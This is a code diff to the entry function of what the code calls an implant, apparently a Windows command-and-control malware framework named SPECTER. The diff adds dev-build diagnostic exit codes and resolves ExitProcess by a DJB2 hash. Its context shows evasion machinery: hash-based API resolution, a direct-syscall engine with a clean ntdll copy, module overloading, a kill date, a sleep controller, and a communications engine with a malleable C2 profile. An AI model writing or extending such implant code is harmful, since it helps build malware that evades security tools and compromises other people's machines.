@@ -24,6 +24,24 @@ extern SYSCALL_TABLE g_syscall_table;
 /* Forward declarations for cleanup */
 static void implant_cleanup(void);
 
+/* Dev build: resolve ExitProcess for diagnostic exit codes */
+#ifdef SPECTER_DEV_BUILD
+typedef void (__attribute__((ms_abi)) *fn_ExitProcess)(DWORD code);
+static fn_ExitProcess g_dev_exit = NULL;
+
+static void dev_exit(DWORD code) {
+    if (g_dev_exit) g_dev_exit(code);
+}
+
+static void dev_init_exit(PVOID k32) {
+    /* DJB2("ExitProcess") = 0x024773DE */
+    g_dev_exit = (fn_ExitProcess)find_export_by_hash(k32, 0x024773DE);
+}
+#define DEV_FAIL(code) do { dev_exit(code); return; } while(0)
+#else
+#define DEV_FAIL(code) return
+#endif
+
 __attribute__((section(".text.entry")))
 void implant_entry(PVOID param) {
     (void)param;
@@ -35,21 +53,24 @@ void implant_entry(PVOID param) {
     /* ---- Step 1: Verify PEB access ---- */
     PPEB peb = get_peb();
     if (!peb)
-        return;
+        DEV_FAIL(10);
 
     /* ---- Step 2: Resolve ntdll and kernel32 base addresses ---- */
     PVOID ntdll_base = find_module_by_hash(HASH_NTDLL_DLL);
     if (!ntdll_base)
-        return;
+        DEV_FAIL(11);
 
     PVOID k32_base = find_module_by_hash(HASH_KERNEL32_DLL);
+#ifdef SPECTER_DEV_BUILD
+    if (k32_base) dev_init_exit(k32_base);
+#endif
     (void)k32_base;
 
     /* ---- Step 3: Initialize the syscall engine ---- */
     g_ctx.syscall_table = &g_syscall_table;
     status = sc_init(g_ctx.syscall_table);
     if (!NT_SUCCESS(status))
-        return;
+        DEV_FAIL(12);
 
     g_ctx.clean_ntdll = g_ctx.syscall_table->clean_ntdll;
 
@@ -86,7 +107,7 @@ void implant_entry(PVOID param) {
     /* ---- Step 4: Initialize config store ---- */
     status = cfg_init(&g_ctx);
     if (!NT_SUCCESS(status))
-        return;
+        DEV_FAIL(13);
 
     /* ---- Step 4b: Module overloading (post-config) ---- */
     {
@@ -122,17 +143,17 @@ void implant_entry(PVOID param) {
 
     /* ---- Step 5: Check kill date before proceeding ---- */
     if (cfg_check_killdate(&g_ctx))
-        return;
+        DEV_FAIL(14);
 
     /* ---- Step 6: Initialize sleep controller ---- */
     status = sleep_init(&g_ctx);
     if (!NT_SUCCESS(status))
-        return;
+        DEV_FAIL(15);
 
     /* ---- Step 7: Initialize communications engine ---- */
     status = comms_init(&g_ctx);
     if (!NT_SUCCESS(status))
-        return;
+        DEV_FAIL(16);
 
     /* ---- Step 7b: Initialize malleable C2 profile (if embedded) ---- */
     /* Profile blob is expected to be provided via config update or
